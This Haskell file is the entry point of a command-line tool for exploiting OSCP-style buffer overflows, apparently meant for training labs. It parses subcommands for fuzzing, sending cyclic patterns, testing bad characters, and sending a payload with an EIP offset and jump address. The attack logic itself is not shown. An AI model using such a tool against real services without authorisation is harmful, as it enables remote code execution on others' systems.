{-# LANGUAGE OverloadedStrings #-}
module Main where

import Overflow
import Overflow.Fuzz
import Overflow.Pattern
import Overflow.BadChars
import Overflow.Exploit
import Turtle

-- ...
data Command =
    -- ...
    Fuzz { host  :: Host 
         , step  :: Int
         , affix :: Affix } |
    -- ...
    Pattern { host   :: Host
            , length :: Int
            , affix  :: Affix } |
    -- ...
    BadChars { host    :: Host
             , offset  :: Int
             , exclude :: Maybe Text
             , affix   :: Affix } |
    -- ...
    Exploit { host    :: Host 
            , offset  :: Int
            , jump    :: Text
            , payload :: Turtle.FilePath
            , affix   :: Affix }
    deriving (Show)

-- ...
description :: Description
description = "A command-line tool for exploiting OSCP-like buffer overflows."

-- ...
parseHost :: Parser Host
parseHost = Host <$> addr <*> port
    where
        addr = argText "host" "Target machine's IP address"
        port = argText "port" "Port the target service is running on"

-- ...
parseAffix :: Parser Affix
parseAffix = (,) <$> prefix <*> suffix
    where
        prefix = optional $
            optText "prefix" 'p' "(optional) Prefix to put before payload"
        suffix = optional $
            optText "suffix" 's' "(optional) Suffix to put after payload"

-- ...
fuzz :: Parser Command
fuzz = Fuzz <$> parseHost <*> step <*> parseAffix
    where
        step = optInt "step" 'S' "The length to increase each iteration by"

-- ...
pattern :: Parser Command
pattern = Pattern <$> parseHost <*> length <*> parseAffix
    where
        length = optInt "length" 'l' "Length of the cyclic pattern to send"

-- ...
badchars :: Parser Command
badchars = BadChars <$> parseHost <*> offset <*> exclude <*> parseAffix
    where
        offset  = optInt "offset" 'o' "The offset of the EIP register"
        exclude = optional $
            optText "exclude" 'e' "(optional) Characters to exclude in payload" 

-- ...
exploit :: Parser Command
exploit = Exploit <$> parseHost
                  <*> offset
                  <*> jump
                  <*> payload
                  <*> parseAffix
    where
        offset  = optInt "offset" 'o' "The offset of the EIP register"
        jump    = optText "jump" 'j' "Jump address for executing shellcode"
        payload = optPath "payload" 'p' "Path to payload to be executed on target"

-- ...
parser :: Parser Command
parser = subcommandGroup "Available commands:"
    [ ("fuzz", "Finds the approximate length of the buffer.", fuzz)
    , ("pattern", "Sends a cyclic pattern of bytes of specified length", pattern) 
    , ("badchars", "Sends every character from 0x00 to 0xFF", badchars)
    , ("exploit", "Attempts to execute a specified payload on target", exploit) ]

-- ...
run :: Command -> IO ()
run (Fuzz h i a)        = runFuzzer h i a
run (Pattern h l a)     = sendPattern h l a 
run (BadChars h o e a)  = sendBadChars h o e a 
run (Exploit h o j f a) = sendExploit h o j (encodeString f) a

main :: IO ()
main = do
    cmd <- options description parser
    run cmd

